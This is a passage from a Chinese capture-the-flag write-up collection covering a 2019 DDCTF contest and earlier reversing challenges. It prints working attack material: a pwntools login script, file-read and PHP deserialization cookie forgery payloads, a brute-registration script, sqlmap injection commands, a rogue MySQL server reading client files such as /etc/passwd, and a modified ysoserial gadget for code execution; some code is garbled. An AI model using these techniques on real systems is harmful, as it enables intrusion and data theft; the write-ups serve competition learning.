0xa0a7aeb5L, 0xbcc3cad1L, 0xd8dfe6edL, 0xf4fb0209L, 0x10171e25L, 0x2c333a41L, 0x484f565dL, 0x646b7279L ] FK = [0xA3B1BAC6L, 0x56AA3350L, 0x677D9197L, 0xB27022DCL] def LeftRot(n, b): return (n > 32 - b) & 0xffffffff def t(a): a4=a>>4 a3=a4>>4 a2=a3>>8 a1=a2>>8 return (Sbox[a1>>4][a1&0xf] >4&0xf][a2&0xf] >4&0xf][a3&0xf] > (128-32),(m >> (128-32*2))&0xffffffff,(m >> 32)&0xffffffff,m&0xffffffff] Y=[lbc(key >> (128-32)),lbc((key >> (128-32*2))&0xffffffff),lbc((key >> 32)&0xffffffff),lbc(key&0xffffffff)][::-1] K=[Y[i]^FK[i] for i in xrange(4)] for i in xrange(32): K.append(K[i]^T_(K[i+1]^K[i+2]^K[i+3]^CK[i])) X=sm4(X,K,1) username='' for i in xrange(4): username += hex(X[i])[2:-1].decode('hex').decode('hex') print username 除了已经得到的用户名，还需要得到密码才能登录进去拿到 Flag。 这里要求输入 6 字节的密码，然后放到 ptr + 4 (i + 0x24LL) 处。而这个 ptr 是在初始化虚拟机的时候定义的。虚拟机运行完毕，`((_DWORD *)ptr + 0x19)` 要等于 0。 现在开始分析这个虚拟机的构造。 这里初始化了虚拟寄存器，基于物理堆实现的虚拟栈，虚拟机指令及其对应的处理函数，虚拟指令表等。 这是虚拟机运行时，需要执行的虚拟指令表。 这是一条执行虚拟机指令表的循环语句，结束标志为 0xFF。刚好对应上虚拟指令表最后一个指令。 到这里就需要启动 人肉虚拟机指令翻译器，它能够结合指令处理函数和指令表，将每一条指令翻译成伪汇编语句。 B0 19 00 00 00: push 0x19 B5 0A: pop r6 B2 0B: push r7 B4 09: pop ptr[r6] B0 1A 00 00 00: push 0x1A B5 0A: pop r6 04 0B 09: r7=ptr[r6] B0 1A 00 00 00: push 0x1A B5 0A: pop r6 B2 0B: push r7 B4 09: pop ptr[r6] 90 C2 00 00 00: jmp 0xC2 91: jmp next 01 1A 00 00 00 0A: r6=0x1A 02 09 00: r1=ptr[r6] 10 09 30 00 00 00 01: r2=&ptr[0x30] B2 01: push r2 B2 00: push r1 C0: *(s0r-1)+=*(s0r-2) B5 00: pop r1 B0 F4 FF FF FF: push 0xFFFFFFF4 B5 0A: pop r6 B1 00: push r1[r6] B5 01: pop r2 01 1A 00 00 00 0A: r6=0x1A B1 09: push ptr[r6] B5 00: pop r1 10 00 78 00 00 00 00: r1+=0x78 70 00 FF 00 00 00 00: r1&=0xFF 50 00 18 00 00 00 00: r1>*(s0r-1) B5 00: pop r1 B2 01: push r2 B2 00: push r1 C3: *(s0r-1)^=*(s0r-2) B5 00: pop r1 50 00 18 00 00 00 00: r1>*(s0r-1) B5 00: pop r1 70 00 FF 00 00 00 01: r2=0xFF&r1 01 19 00 00 00 0A: r6=0x19 02 09 00: r1=ptr[r6] 11 01 00 00: r1+=r2 B0 19 00 00 00: push 0x19 B5 0A: pop r6 B2 00: push r1 B4 09: pop ptr[r6] 01 1A 00 00 00 0A: r6=0x1A B1 09: push ptr[r6] B5 00: pop r1 10 00 01 00 00 00 00: r1+=0x01 01 1A 00 00 00 0A: r6=0x1A 04 00 09: ptr[r6]=r1 B0 1A 00 00 00: push 0x1A B5 0A: pop r6 02 09 00: r1=ptr[r6] 86 00 06 00 00 00 00: r1=r1不过这样还是有点难看懂，那不妨将 `人肉虚拟机指令翻译器`` 的功率调大，让它输出更加美妙而神奇的代码。 ptr_0x1A=0 password='******' for i in range(0x06): ptr_0x1A+=ord(password[i])^(0x78+i) 这样的代码具有很强的艺术观赏性。怀着美好的心情，掐指一算密码就是 xyz{|}。 借助 自然之力 登录进去，顺利拿到 pizza大佬 留下的丰厚宝藏：pizza's原味flag 一枚。 from pwn import * io=remote('39.106.224.151', 10001) io.send('badrer12\\n') io.send('xyz{|}') io.interactive() Flag: flag{eafd_134g_vp1d_vsdr_v5yg_ai0g_fsdg_g24t_sdfg} easygo 根据题目名称和 IDA 结合来看，猜测是一个 go 写的程序。 程序的符号信息被去除了，用 IDAGolangHelper 恢复符号信息。 然后看main_main 函数，在encoding_base64__ptr_Encoding_DecodeString 处下断点。 单步调试到这里，跟进 rsi 地址的内存数据，就能看到 flag 了。 Flag: flag{92094daf-33c9-431e-a85a-8bfbd5df98ad} strange_int 篇幅问题，请移步：https://www.52pojie.cn/thread-936377-1-1.html 评论区 请文明评论，禁止广告 "},"articals/2019ddctf.html":{"url":"articals/2019ddctf.html","title":"2019DDCTF","keywords":"","body":"2019DDCTF滴滴高校闯关赛 本题已开通评论，欢迎在页面最下方留言吐槽。 题目类型： 类型 年份 难度 官方赛事题 2019 中 题目下载： 链接: https://pan.baidu.com/s/16CV9YL5maNYIi-TbXzMWHg 提取码: tdbs 网上公开WP： https://mp.weixin.qq.com/s/eYCP2L6kK0mpg8CURIJajQ https://mp.weixin.qq.com/s/af5KMZ5AZ4Xk8jJanGu4mQ https://mp.weixin.qq.com/s/zFcVYOE383kheD08j21PBg https://mp.weixin.qq.com/s/cRQQ-3-V-E-I22G_uJRZgw https://mp.weixin.qq.com/s/NmgVHSMxIAh0iSOe5fdWgQ https://xz.aliyun.com/t/4862 https://xz.aliyun.com/t/4849 https://mp.weixin.qq.com/s?__biz=MzA3Mzk1MDk1NA==&mid=2651905380&idx=1&sn=2d85c96fe650fb625b53fbf8536ee0f5&chksm=84e34ee1b394c7f7d6d9302d5ebe0be50b1444b02a3b7f250f3898040618a9525532ba23f854&mpshare=1&scene=23&srcid=#rd http://cdusec.happyhacking.top/?post=49 https://www.zhaoj.in/read-5269.html http://12end.xyz/ddctf-writeup/ http://yuufeng.com/ https://blog.csdn.net/m0_37809075/article/details/89280350 https://www.xmsec.cc/p/4891b1d2-1166-4553-951c-d46cbac95af3/ http://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485730&idx=1&sn=cb90f178c56453f558acc626ec84ddad&chksm=e89e21fadfe9a8ecca8ac397984045c7ebda97577ac082d94141d37d0b12d70222128f0af2e7&mpshare=1&scene=23&srcid=#rd 本站备份WP： 感谢作者：evoA、5am3、Glzjin、12end、admin-琴里、Yunen WEB 滴~ 本题作者：Yunen 题目地址：http://117.51.150.246/打开题目：发现页面进行了一次调整，跳转后的url：http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09猜测jpg参数的值为base64编码后的内容，解码内容如下：NjY2QzYxNjcyRTZBNzA2Nw==明显的base64编码，再进行一次解码：666C61672E6A7067观察数据，发现两两一组时，字母全在数字后，且范围在[A-F]之内，猜测为HEX，将其转换为Ascii试试：flag.jpg明显的任意文件读取漏洞，尝试读取index.php将index.php其转换成HEX，再两次转Base64得：TmprMlpUWTBOalUzT0RKbE56QTJPRGN3替换原来的jpg值访问：红框部分即为index.php的base64编码过的内容，复制下来解码得： '.$_GET['jpg'].''; $file = preg_replace(\"/[^a-zA-Z0-9.]+/\",\"\", $file); echo $file.''; $file = str_replace(\"config\",\"!\", $file); echo $file.''; $txt = base64_encode(file_get_contents($file)); echo \"\"; /* * Can you find the flag file? * */ ?> 题目提示了一个url，还有一个日期(2018-7-4)。 打开提示文章，发现该文章发表时间与提示时间不同。打开作者首页，找到2018-7-4发表的文章：https://blog.csdn.net/FengBanLiuYun/article/details/80913909这里有个巨大脑洞！！写这题的时候真想杀了出题人猜测存在备份文件practice.txt.swp，访问之~:提示flag存在于f1ag!ddctf.php文件，使用index.php读取之~由于$file = preg_replace(\"/[^a-zA-Z0-9.]+/\",\"\", $file);，我们无法直接输入!不过由于$file = str_replace(\"config\",\"!\", $file);，我们可以使用config来代替。故payload为:117.51.150.246/index.php?jpg=TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==返回内容base64解码： 简单的变量覆盖题，extract($_GET);会将GET内容转换成变量。file_get_contents($k)使用php://input将会返回post的数据getflag:flag: DDCTF{436f6e6772617******174696f6e73} Web签到题 打开题目，提示不是管理员权限，观察请求header，发现字段：didictf_username的值为空burp拦截数据包修改为admin，返回内容：您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php访问app/fL2XID2i0Cdh.php得源码： url:app/Application.php Class Application { var $path = ''; public function response($data, $errMsg = 'success') { $ret = ['errMsg' => $errMsg, 'data' => $data]; $ret = json_encode($ret); header('Content-type: application/json'); echo $ret; } public function auth() { $DIDICTF_ADMIN = 'admin'; if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) && $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) { $this->response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'); return TRUE; }else{ $this->response('抱歉，您没有登陆权限，请获取权限后访问-----','error'); exit(); } } private function sanitizepath($path) { $path = trim($path); $path=str_replace('../','',$path); $path=str_replace('..\\\\','',$path); return $path; } public function __destruct() { if(empty($this->path)) { exit(); }else{ $path = $this->sanitizepath($this->path); if(strlen($path) !== 18) { exit(); } $this->response($data=file_get_contents($path),'Congratulations'); } exit(); } } url:app/Session.php include 'Application.php'; class Session extends Application { //key建议为8位字符串 var $eancrykey = ''; var $cookie_expiration = 7200; var $cookie_name = 'ddctf_id'; var $cookie_path = ''; var $cookie_domain = ''; var $cookie_secure = FALSE; var $activity = \"DiDiCTF\"; public function index() { if(parent::auth()) { $this->get_key(); if($this->session_read()) { $data = 'DiDI Welcome you %s'; $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']); parent::response($data,'sucess'); }else{ $this->session_create(); $data = 'DiDI Welcome you'; parent::response($data,'sucess'); } } } private function get_key() { //eancrykey and flag under the folder $this->eancrykey = file_get_contents('../config/key.txt'); } public function session_read() { if(empty($_COOKIE)) { return FALSE; } $session = $_COOKIE[$this->cookie_name]; if(!isset($session)) { parent::response(\"session not found\",'error'); return FALSE; } $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this->eancrykey.$session)) { parent::response(\"the cookie data not match\",'error'); return FALSE; } $session = unserialize($session); if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent'])){ return FALSE; } if(!empty($_POST[\"nickname\"])) { $arr = array($_POST[\"nickname\"],$this->eancrykey); $data = \"Welcome my friend %s\"; foreach ($arr as $k => $v) { $data = sprintf($data,$v); } parent::response($data,\"Welcome\"); } if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) { parent::response('the ip addree not match'.'error'); return FALSE; } if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) { parent::response('the user agent not match','error'); return FALSE; } return TRUE; } private function session_create() { $sessionid = ''; while(strlen($sessionid) md5(uniqid($sessionid,TRUE)), 'ip_address' => $_SERVER['REMOTE_ADDR'], 'user_agent' => $_SERVER['HTTP_USER_AGENT'], 'user_data' => '', ); $cookiedata = serialize($userdata); $cookiedata = $cookiedata.md5($this->eancrykey.$cookiedata); $expire = $this->cookie_expiration + time(); setcookie( $this->cookie_name, $cookiedata, $expire, $this->cookie_path, $this->cookie_domain, $this->cookie_secure ); } } $ddctf = new Session(); $ddctf->index(); 这里我才有回溯的方法，先确定flag可能的输出点在构造满足条件的payload。在private function get_key()函数里提示到flag与eanccrykey在同一个文件夹，猜测flag内容在../config/flag.txt里。通读代码，可以发现唯一可能的flag输出点在public function __destruct()，这是Application类的析构函数，退出时会自动执行里边的代码，结合下边的serialize与unserialize易知此题考的是php反序列化。而我们发现，如果我们直接对cookie进行修改是不行，这是因为服务端使用key进行了加密验证处理，如果我们能拿到key的内容，那么变可以轻易绕过。 if(!empty($_POST[\"nickname\"])) { $arr = array($_POST[\"nickname\"],$this->eancrykey); $data = \"Welcome my friend %s\"; foreach ($arr as $k => $v) { $data = sprintf($data,$v); } parent::response($data,\"Welcome\"); } 我们注意到此处函数涉及到key值的操作，其中sprintf为占位符替换函数。如果我们post的nickname值里存在%s 那么key值也会随着输出。先获得cookie值，记得header头加上didictf_username: admin将cookie替换，post内容:nickname=a---%s得到key:EzblrbNS，至此大工告成。理清下思路： 1.新建Application类，修改path变量为..././config/flag.txt(../进行过一次过滤) 2.将类加入$userdata数组进行序列化处理 3.返回key加密后的cookie 4.getflag 本地搭建php环境： 将以下源码复制访问 即可生成序列化数据： $errMsg, 'data' => $data]; $ret = json_encode($ret); header('Content-type: application/json'); echo $ret; } public function auth() { return true; } private function sanitizepath($path) { $path = trim($path); $path=str_replace('../','',$path); $path=str_replace('..\\\\','',$path); return $path; } public function __destruct() { $this->response($this->user_agent); if(empty($this->path)) { $this->response(\"error111\"); exit(); }else{ $path = $this->sanitizepath($this->path); if(strlen($path) !== 18) { exit(); } $this->response($data=file_get_contents($path),'Congratulations'); } exit(); } } class Session extends Application { //key建议为8位字符串 var $eancrykey = ''; var $cookie_expiration = 7200; var $cookie_name = 'ddctf_id'; var $cookie_path = ''; var $cookie_domain = ''; var $cookie_secure = FALSE; var $activity = \"DiDiCTF\"; public function index() { if(parent::auth()) { $this->get_key(); if($this->session_read()) { $data = 'DiDI Welcome you %s'; $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']); parent::response($data,'sucess'); }else{ $this->session_create(); $data = 'DiDI Welcome you'; parent::response($data,'sucess'); } } } private function get_key() { //eancrykey and flag under the folder $this->eancrykey = 'EzblrbNS'; } public function session_read() { if(empty($_COOKIE)) { return FALSE; } $session = $_COOKIE[$this->cookie_name]; if(!isset($session)) { parent::response(\"session not found\",'error'); return FALSE; } $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this->eancrykey.$session)) { parent::response(\"the cookie data not match\",'error'); return FALSE; } $session = unserialize($session); if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent'])){ return FALSE; } if(!empty($_POST[\"nickname\"])) { $arr = array($_POST[\"nickname\"],$this->eancrykey); $data = \"Welcome my friend %s\"; foreach ($arr as $k => $v) { $data = sprintf($data,$v); } parent::response($data,\"Welcome\"); } if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) { return true; } if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) { parent::response('the user agent not match','error'); return FALSE; } return TRUE; } private function session_create() { $sessionid = ''; while(strlen($sessionid) path = '..././config/flag.txt'; //修改类中变量path $userdata = array( $a, //序列化 'session_id' => md5(uniqid($sessionid,TRUE)), 'ip_address' => $_SERVER['REMOTE_ADDR'], 'user_agent' => $_SERVER['HTTP_USER_AGENT'], 'user_data' => '', ); $cookiedata = serialize($userdata); parent::response($cookiedata); $cookiedata = $cookiedata.md5($this->eancrykey.$cookiedata); $expire = $this->cookie_expiration + time(); setcookie( $this->cookie_name, $cookiedata, $expire, $this->cookie_path, $this->cookie_domain, $this->cookie_secure ); } } $ddctf = new Session(); $ddctf->index();?> 生成数据： a:5:{i:0;O:11:\"Application\":1:{s:4:\"path\";s:21:\"..././config/flag.txt\";}s:10:\"session_id\";s:32:\"d31fd78332ef2737d3c007915d643d86\";s:10:\"ip_address\";s:13:\"192.168.246.1\";s:10:\"user_agent\";s:115:\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36\";s:9:\"user_data\";s:0:\"\";} 注意此处的数据由于UA头不同，请自己生成。记得加上key进行md5加密： import hashlib str = 'EzblrbNS'+'a:5:{i:0;O:11:\"Application\":1:{s:4:\"path\";s:21:\"..././config/flag.txt\";}s:10:\"session_id\";s:32:\"d31fd78332ef2737d3c007915d643d86\";s:10:\"ip_address\";s:13:\"192.168.246.1\";s:10:\"user_agent\";s:115:\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36\";s:9:\"user_data\";s:0:\"\";}' print(hashlib.md5(str.encode('utf8')).hexdigest()) 得到hash:3c27da16d59c7edbacbf41a5cea391c3修改数据包重放：记得先url编码哟~flag: DCTF{ddctf2019_*****_pHVlHIDDGdV8qA2j} UploadIMG 作者：Glzjin 知识点：PHP-GD 二次渲染绕过 步骤： 1、用上面给出的用户名密码打开靶机，发现是这么一个页面。2、那么就传一个图片上去试试吧。3、上传之后，发现提示 “[Check Error]上传的图片源代码中未包含指定字符串:phpinfo()”，并且还返回了上传之后图片的地址。4、那么我们就把我们上传之后的图片下载回来看看吧。下载之后用 hex 编辑器打开。发现开头这儿指明了其是 php-gd 带着 libjpeg 转换的。5、比较一下原图片和现在的图片，似乎有很多不同。6、那么我们把下载下来的图片再传回去呢？7、啊哈，这一把前面倒是蛮多相同的地方了。8、那么我们就往里面相同的部分替换 “phpinfo()” (9字节)试试。9、不断 fuzz 插入的位置，发现插入这里可以。10、Flag 到手~ 大吉大利，今晚吃鸡~ 本文作者：12end进去注册，登录后只有100金币，但是吃鸡的ticket需要2000金币，需要想办法绕过去。 购买ticket 截取添加订单的请求，发现是一个简单的get请求，且ticket_price是可控的：经尝试发现，这个tickiet_price只可以修改地比2000大，且只能含有数字，那么我们只能考虑整数溢出了。在32位系统下，所有无符号整数的数量是2^32=4294967296，去掉0这个数的话，最大整数便是4294967295，当我们令一个数等于2^32时，它便会溢出为0。我们这里传入4294967297,虽然订单页面显示的还是如此，但实际支付订单时，它才产生了溢出，初步认为他是以字符串存入，在运算时再转换为整型（可能并不准确），最后只花了1金币购买：进到游戏之后，可以通过提交正确id与ticket来移除对手，没什么好办法，经过一番尝试了解到id与ticket是固定对应的关系，只有写脚本通过暴力注册获取尽可能多的id，然后一一删除了。 tips:剩余对手的100人中，id是任意的，你并不能保证只需要注册100次就可以删掉全部的对手，最有效的办法是注册一次删除一次。 因篇幅原因，抓取api请求，并编写脚本的过程便不再赘述，脚本注释已较为详尽，使用时修改参数即可，唯一缺憾是代码健壮性欠佳，遇到网络问题时不能处理错误造成崩溃，但代码作用是可续的，所以问题不大，重启脚本就可以继续了 import requests import time regist = \"http://117.51.147.155:5050/ctf/api/register?password=11111111&name=\"#name添加一个前缀 buy_ticket = \"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296\" pay_ticket = \"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=\" delete = \"http://117.51.147.155:5050/ctf/api/remove_robot\" get_flag=\"http://117.51.147.155:5050/ctf/api/get_flag\" i= 55555 #初始化用户名,使用未注册过的数字 def delete_robot(player_id, player_ticket): COOKIE = {\"Cookie\": \"user_name=; REVEL_SESSION=\"} #修改为自己主账户的cookie param={\"id\":player_id,\"ticket\":player_ticket} requests.get(delete,params=param, headers=COOKIE) #删除id flag = requests.get(get_flag, headers=COOKIE) #获取剩余的敌人数量 print(flag.text ) while True: t = requests.session() i+=1 r = t.get(regist + str(i)) #注册 r = t.get(buy_ticket).json() #购买Ticket，解析json bill_id = r[\"data\"][0][\"bill_id\"] #json解析bill_id r = t.get(pay_ticket + bill_id).json() #支付订单 player_id = r[\"data\"][0][\"your_id\"] player_ticket = r[\"data\"][0][\"your_ticket\"] #json解析id与ticket delete_robot(player_id,player_ticket) #使用主账户删除id time.sleep(0.3) #短暂休眠避免被封 homebrew event loop 作者：12end直接审计源码对于本题的字串切割函数get_mid_str请自行理解，如果不明白这个函数的话，下面的payload将难以理解原理。首先，eval的那部分由于分割不当可以通过注释符导致代码执行，我们可以构造?action:show_flag_function%23;请求来执行一个（没卵用的函数）:能够执行，就该思考怎么进一步利用以获取flag不难看出，本题靠队列控制函数的执行流程，且唯一获取flag的函数被ban掉了返回值: def show_flag_function(args): #被ban的输出flag函数，没有return flag flag = args[0] #return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. return 'You naughty boy! ;) ' 仔细观察代码，我们发现还可以从两个地方获取flag： 1.直接执行FLAG() 2.执行get_flag_handler会通过trigger_event('func:show_flag;' + FLAG())将flag的值入队 我最开始想到的方法便是直接执行FLAG()，在flask中，视图函数的返回值会被传输到前端以供展示，这道题的视图函数entry_point的返回值是execute_event_loop(),而execute_event_loop的返回值resp是由事件循环中执行函数的返回值ret_val决定的，这也就是我们直接执行show_flag_function函数会将返回值打印在前端的原因。以此推出，如果能直接执行FLAG()，flag也会被打印出来。到此为止似乎一帆风顺，我们把上面的请求稍作修改不就可以拿flag了吗？实际测试却404了。 404的原因在这里： try: event_handler = eval(action + ('_handler' if is_action else '_function')) #eval造成的代码执行，从这里下手 ret_val = event_handler(args) #获取返回值 可以看到第三行的执行函数是带有参数的，而我们试图向一个不需要参数的函数传参时，python会抛出参数过多的错误，try失败后就会导致404。思考了很久也没有想出能够绕过这里的地方，如果绕过去了，这应当是一个非预期解。 经@Smi1e师傅的指导，知道这道题要利用flask的客户端session导致的安全问题。相关文章：客户端 session 导致的安全问题好巧不巧，题中的执行队列恰巧是存储在session中的。那么，我们只需要利用上面提到的第二点来将flag值入队，解密此时的session即可。payload:?action:trigger_event%23;action:buy;5%23action:get_flag; mysql弱口令 作者：12end提示先部署agent.py再进行弱口令扫描 在agent.py的响应函数中，返回了result的响应内容，result的值来源于_func函数： class RequestHandler(BaseHTTPRequestHandler): def do_GET(self): .... ... result = self._func() self.wfile.write(json.dumps(result)) 研究一下_func()： def _func(self): netstat = Popen(['netstat', '-tlnp'], stdout=PIPE) //执行netstat子进程，获取在监听的tcp服务程序名等信息并输入至pipe netstat.wait() //等待子进程结束 ps_list = netstat.stdout.readlines() //逐行读取 result = [] for item in ps_list[2:]: tmp = item.split() Local_Address = tmp[3] Process_name = tmp[6] tmp_dic = { 'local_address': Local_Address, 'Process_name': Process_name } result.append(tmp_dic) //向result中增加字典元素，包含着进程的源地址及进程名称 return result 可以看出整个程序的作用就是返回tcp服务进程的相关信息，猜测题目的服务器（下称靶机）是以此判断mysql是否在目标服务器（下称客户机）上运行。 尝试一番，当我们未在客户机上运行agent.py时，会提示： 而此时，我们客户机的Mysql是开启着的。 同样，将客户机的Mysql关闭，agent.py运行，会提示未扫描到弱密码。mysql的进程名称是mysqld，我们直接修改self.wfile.write(json.dumps(result))为mysqld可以成功绕过服务器的判断。 绕过了，然后呢？祭出我@Smi1e师傅的一篇blog：MySQL LOAD DATA 读取客户端任意文件 如何利用MySQL LOCAL INFILE读取客户端文件 大意是指,主机A连接远程mysql服务器主机B的过程中，所有请求都是明文传输，而我们可以在主机B上伪造任意内容发送给主机A。 而在MySQL中，LOAD DATA LOCAL INFLIE语句会将本地内容传输给远端服务器，下面是执行LOAD DATA LOCAT INFILE的过程： 本地向远端服务器发起请求包，请求包含要传输的文件路径-> 远端服务器对请求进行响应，响应内容为请求包中的文件路径-> 本地发送响应包中的文件内容 如果我们可以伪造响应的任意内容，也就意味着能够读取到连接者本地的任意文件 最重要的是伪造的服务端可以在任何时候回复一个file-transfer 请求，不一定非要是在客户端发送LOAD DATA LOCAL数据包的时候。（前提是客户端已经请求了任意内容，幸运的时，绝大多数客户端都会在连接mysql成功时发送一系列类似@@version的初始化请求） 不过如果想要利用此特性，客户端必须具有CLIENT_LOCAL_FILES即(Can use LOAD DATA LOCAL)属性。如果没有的话，就要在连接mysql的时候加上--enable-local-infile。 回归正题，为了与靶机建立连接，我们就需要让靶机认为已经连接上了我们的数据库，我们只需向其响应greeting以及authok的数据包即可，然后再发送精心构造好的数据包，让靶机把我们想要的文件给响应过来在github上已有相关的项目以部署这样的恶意mysql服务器：Rogue-MySql-Server在这里以python的脚本为例： 修改26行的filelist为我们想要读取的文件路径，假设为’/etc/passwd’，先开启agent.py欺骗靶机，告诉它我们已经开启了mysqld进程，再开启这个poc.py，然后让靶机扫描一下我们的客户机： 最后的文件信息会在当前目录下的mysql.log：root用户的mysql操作一般记录在：~/.mysql_history中，读取一下就可以拿到flag 欢迎报名DDCTF 作者：evoA太脑洞了，太脑洞了，太脑洞了一直以为是sql，直到用xss的exp发现有bot请求在报名页面的备注里只对sql进行一点过滤，但是xss没有任何过滤，直接即可通过xss平台读页面源码读到一个接口http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id= 测了半天注入还是没东西，结果一堆人做出来后重新复测，注意到返回头GBK然后就是宽字节注入SQLmap加tamper都可以跑 #所有数据库名 python2 sqlmap.py -u \"http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1\" --tamper unmagicquotes --dbs --hex #数据库表名 python2 sqlmap.py -u \"http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1\" --tamper unmagicquotes --hex -D \"ctfdb\" --tables #字段名 python2 sqlmap.py -u \"http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1\" --tamper unmagicquotes --hex -D \"ctfdb\" -T \"ctf_fhmHRPL5\" --columns #flag python2 sqlmap.py -u \"http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1\" --tamper unmagicquotes --hex --sql-shell sql-shell> select ctf_value from ctfdb.ctf_fhmHRPL5; 常规操作，注库名，表名，字段名（TCL）做的时候想的太复杂了，但是我的sqlmap最后这里不能直接--dump，所以我执行了--sql-shell自定义sql命令最终拿的flagsqlmap宽字节注入自带的tamper是unmagicquotes这里因为过滤了单引号，所以我们需要用--hex参数将字符串转为0x开头的16进制数字避开引号 再来1杯Java 作者：5am3p.s.压轴题哈，说实话，这题真的学会了不少东西。毕竟自己太菜了，虽然本科专业为java开发狗。但我真的不太熟啊...一共分为三关吧。 首先是一个PadOracle攻击，伪造cookie。这个解密Cookie可以看到hint： PadOracle:iv/cbc。 第二关，读文件，看到后端代码后，才发现，这里贼坑。 第三关，反序列化。 首先第一关好说，其实在/api/account_info这个接口，就可以拿到返回的明文信息。然后通过Padding Oracle + cbc翻转来伪造cookie即可。在这里就不多说了。网上很多资料。 最后拿到cookie，直接浏览器写入cookie就OK。然后可以获取到一个下载文件的接口。 /api/fileDownload?fileName=1.txt 虽然说是一个任意文件读取的接口，但是贼坑、一顿操作猛如虎，最后只读出/etc/passwd... 搜到了很多字典。然后burp爆破一波，最后发现/proc/self/fd/15这里有东西，看到熟悉的pk头，情不自禁的笑了起来。（对，就是源码）源码也不多，很容易，可以看到一个反序列化的接口。在反序列化之前，还调用了SerialKiller，作为一个waf，对常见payload进行拦截。首先题目给了hint：JRMP。根据这个hint，我们可以找到很多资料。在这里自己用的ysoserial，根据他的JRMP模块来进行下一步操作。在这里，JRMP主要起了一个绕过waf的功能，因为这个waf只在反序列化userinfo时进行了调用。当通过JRMP来读取payload进行反序列化时，不会走waf。首先，JRMP这个payload被waf掉了，我们可以采用先知上的一种绕过方式。 https://xz.aliyun.com/t/2479 直接修改ysoserial源码即可，将原有的JRMPClient的payload复制一份，改名为JRMPClient2，然后保存并编译。此时我们可以尝试使用URLDNS模块，来判断是否攻击成功。修改替换开启监听端口建议采用ceye的dnslog查看java -cp ./ysoserial-5am3.jar ysoserial.exploit.JRMPListener {{port}} URLDNS {{http://eval.com}}生成链接JRMPListener的payloadip端口那里填写运行第4行脚本的主机地址端口java -jar ./ysoserial-5am3.jar JRMPClient2 {{10.0.0.1:8119}} | base64此时将第10行生成的代码，直接打到远程即可。然后查看dnslog信息。发现存在，那就是ok了。接下来可以尝试换payload了。此时这里还存在一个问题。服务器端无法执行命令！！这个是hint中给的，所以我们需要找另一种方式，如：代码执行。查阅资料，发现ysoserial预留了这块的接口，修改即可。 https://blog.csdn.net/fnmsd/article/details/79534877 然后我们尝试去修改ysoserial/payloads/util/Gadgets.java中createTemplatesImpl方法如下： // createTemplatesImpl修改版，支持代码执行 public static T createTemplatesImpl ( final String command, Class tplClass, Class abstTranslet, Class transFactory ) throws Exception { final T templates = tplClass.newInstance(); // use template gadget class ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(StubTransletPayload.class)); pool.insertClassPath(new ClassClassPath(abstTranslet)); final CtClass clazz = pool.get(StubTransletPayload.class.getName()); // run command in static initializer // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections // String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"\" + // command.replaceAll(\"\\\\\\\\\",\"\\\\\\\\\\\\\\\\\").replaceAll(\"\\\"\", \"\\\\\\\"\") + // \"\\\");\"; String cmd=\"\"; //如果以code:开头，认为是代码，否则认为是命令 if(!command.startsWith(\"code:\")){ cmd = \"java.lang.Runtime.getRuntime().exec(\\\"\" + command.replaceAll(\"\\\\\\\\\",\"\\\\\\\\\\\\\\\\\").replaceAll(\"\\\"\", \"\\\\\\\"\") + \"\\\");\"; } else{ System.err.println(\"Java Code Mode:\"+command.substring(5));//使用stderr输出，防止影响payload的输出 cmd = command.substring(5); } clazz.makeClassInitializer().insertAfter(cmd); // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion) clazz.setName(\"ysoserial.Pwner\" + System.nanoTime()); CtClass superC = pool.get(abstTranslet.getName()); clazz.setSuperclass(superC); final byte[] classBytes = clazz.toBytecode(); // inject class bytes into instance Reflections.setFieldValue(templates, \"_bytecodes\", new byte[][] { classBytes, ClassFiles.classAsBytes(Foo.class) }); // required to make TemplatesImpl happy Reflections.setFieldValue(templates, \"_name\", \"Pwnr\"); Reflections.setFieldValue(templates, \"_tfactory\", transFactory.newInstance()); return templates; } 此时，我们的payload已经可以支持代码执行了。在这里，我是直接用本地的题目环境进行调试，尝试打印了aaa,操作如下。修改替换开启监听端口建议采用ceye的dnslog查看执行时合并为一行，为了好看，我换了下行 java -cp ysoserial-5am3.jar ysoserial.exploit.JRMPListener 8099 CommonsBeanutils1 'code:System.out.printld(\"aaa\");' 